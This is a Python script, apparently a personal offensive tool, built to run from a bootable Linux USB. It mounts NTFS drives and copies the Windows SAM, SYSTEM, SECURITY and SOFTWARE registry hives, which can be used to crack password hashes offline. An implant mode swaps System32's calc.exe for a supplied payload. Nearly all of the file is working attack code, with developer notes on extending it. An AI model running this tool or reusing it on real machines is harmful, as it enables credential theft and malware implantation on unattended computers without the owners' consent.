#!/usr/bin/env python3

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans 
# for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS 
#and exfils the calc.exe program for now.

#maybe import os?

import sys, subprocess, argparse, time, shutil, os, datetime

class Drive:
    def __init__(self):
        self.source = '' 
        self.fs = '' 
    def set_source(self, source):
        self.source = source
    def set_fs(self, fs):
        self.fs = fs
    def get_source(self):
        return self.source
    def get_fs(self):
        return self.fs
    def is_mounted(self):
        proc = subprocess.Popen('sudo mount', 
                stdout=subprocess.PIPE, shell=True)
        (mounted_drives, err) = proc.communicate()
        mounted_drives = mounted_drives.decode('utf-8')     
        if self.get_source() in mounted_drives:
            return 'yes'
        else:
            return 'no'

#Run the command sudo blkid and then recieve its output as a bytes
#Decode using utf-8 and then split on \n
def grab_drives():
    proc = subprocess.Popen('sudo blkid', stdout=subprocess.PIPE, 
            shell=True)
    (drives, err) = proc.communicate()
    drives = drives.decode('utf-8').split('\n')
    return drives

# extracts the drives with ntfs types
# make Modular for inclusion of *nix systems?
def locate_winfs(drives):
    win_drives = []
    for drive in drives:
        if 'ntfs' in drive:
            win_drives.append(drive)
    return win_drives
 
def mount_drive(drive):
    #should refactor to accept input for /media/drivetype 
    # to exploit different file systems got rid of /etc/services 
    # from mount command. Don't think I need it
    try:
        os.mkdir('/media/windows')
        print('/media/windows has been created for you, and will'
                ' be used as a mounting point')
    except PermissionError:
        print('was unable to create mountpoint. Please run '
                'hashsnatcher as root.')
        sys.exit()
    except FileExistsError:
        print('/media/windows exists, and will be used as a '
                'mounting point')
    subprocess.Popen('sudo mount -t ntfs-3g -o nls=utf8 {} '
            '/media/windows'.format(drive.get_source()), shell=True)
    time.sleep(1)

def copy_winpayload():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool

    stamp = str(datetime.datetime.now().timestamp())
    directory = f'{os.getcwd()}/hives_{stamp[:10]}'
    os.mkdir(directory) 

    try:
        shutil.copyfile('/media/windows/Windows/System32/config/sam', 
                f'{directory}/sam')
    except FileNotFoundError as e:
        print('sam not found')

    try:
        shutil.copyfile('/media/windows/Windows/System32/config/system',
                f'{directory}/system')
    except FileNotFoundError as e:
        print('system not found')

    try:
        shutil.copyfile('/media/windows/Windows/System32/config/security', 
                f'{directory}/security')
    except FileNotFoundError as e:
        print('security not found')
    try:
        shutil.copyfile('/media/windows/Windows/System32/config/software',
                f'{directory}/software')
    except FileNotFoundError as e:
        print('software not found')
        
        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys' 
        # '/home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
    print('registry hives have been succesfully exfiltrated to your pwd')

    #optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /media/windows', shell=True)
    print('Drive has been unmounted from /media/windows')

def store_drives(raw_drives):
    # takes as input raw_drives from the blkid command
    # Returns a list of Drive objects

    obj_drives = []
    for i in range(len(raw_drives)):
        temp_drive = Drive()
        temp_raw_drive = raw_drives[i].split()
        for attribute in temp_raw_drive:
            if '/dev' in attribute:         
                attribute = list(attribute)
                attribute.pop()
                attribute = ''.join(attribute)
                temp_drive.set_source(attribute)     
            elif 'TYPE' in attribute:
                temp_drive.set_fs(attribute)
        obj_drives.append(temp_drive)
    return obj_drives

def check_for_windrives(raw_drives):
    #looking back this code is actually so trash. Gotta refactor.
    drive_count = 0
    raw_win_drives = locate_winfs(raw_drives)
    win_drives = store_drives(raw_win_drives)
    #not the happiest with this code but it works
    if len(raw_win_drives) < 1:
        print('no exploitable drives')
        return False
    else:
        print('\nConected drives using the NTFS file system.\n')
        for drive in raw_win_drives:
            print('[Drive {}] {}\n'.format(drive_count, drive))
            drive_count += 1
        target = input('\n========================================='
                '===============\nplease choose a drive to exploit.'
                ' Note drives start at 0\n\nDrive')
        print('****************************************************'
                '*****************************************')
        print('Targeting: ' + raw_win_drives[int(target)])
        mount_drive(win_drives[int(target)])
        return True

def implant_malware():
    try:
        # I need to implemnt something instead of hardcoding 
        # /media/windows
        shutil.copyfile('/media/windows/Windows/System32/calc.exe', 
                '/media/windows/Windows/System32/calc.exe.bak')
        shutil.copyfile('/calc.exe', 
                '/media/windows/Windows/System32/')
        print('[*] payload has been uploaded to the host')
    except FileNotFoundError:
        print('drive not exploitable')

    subprocess.Popen('sudo umount /media/windows', shell=True)






def pretty_print(drives):
    # takes as input an instance of the Drive class and prints
    # out useful data about the given drive.

    subprocess.call('cat assets/ascii_art', shell=True)
    print('\n\n\t\t\t    *****************************************'
            '****************************************************',
            end ='')
    print('\n\t\t\t    ***********************************A TABLE'
            ' OF ALL CONNECTED DEVICES**************************',
            end ='')
    print('\n\t\t\t    *******************************************'
            '**************************************************',
            end ='')
    print('\n\t\t\t    *\t\tDrive Location\t\t\t  File System\t\t\t'
            'Mounted\t\t*',end ='')
    for drive in drives:
        if len(drive.get_fs()) > 6:
            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   '
                    '{}\t\t*'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')
        elif len(drive.get_fs()) == 4:
            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t\t  '
                    ' {}\t\t*'.format(drive.get_source(), 
                        drive.get_fs(),
                        drive.is_mounted()), end='')
    print('\n\t\t\t    *******************************************'
            '**************************************************',
            end ='\n')


def main():

    parser = argparse.ArgumentParser(
            description=('Choose which mode to run program in. No '
            'input lists all the storage devices.'))
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-xh', '--extract_hives', action='store_true')
    group.add_argument('-i', '--implant', action='store_true')
    args = parser.parse_args()

    # this grabs the raw text for the connected drives
    raw_drives = grab_drives()
    # this stores the raw drived as a Drive obj.
    conected_drives = store_drives(raw_drives)
    if args.extract_hives:
        if check_for_windrives(raw_drives):
            copy_winpayload()
    elif args.implant:
        if check_for_windrives(raw_drives):
            implant_malware()
        
    elif not len(sys.argv) > 1:
        #no cmd line arg was given so just print connected drives 
        pretty_print(conected_drives)
    else:
        print('invalid flag')

if __name__ == '__main__':
    main()
    

#pretty print script CHECK
# 
# What happens when yourun with no drives CHECK

# copy sam syste security and software NEEDS ATTENTION

# Modularize code to implement non hardcoded vals maybe add user input to select mount point and if none exists
# ask the user if they want to make a mountpoint

# unmount the drive at end of execution CHECK

# new arg that cp files onto the windows box

# find calc.exe rename it to calcbak.exe calc.bak? upload own version of calc

# bonus win10 registry of offline systems. 

# shit get cached in hybernation file?

# make table dynamically pull available file systems and display them. CHECK
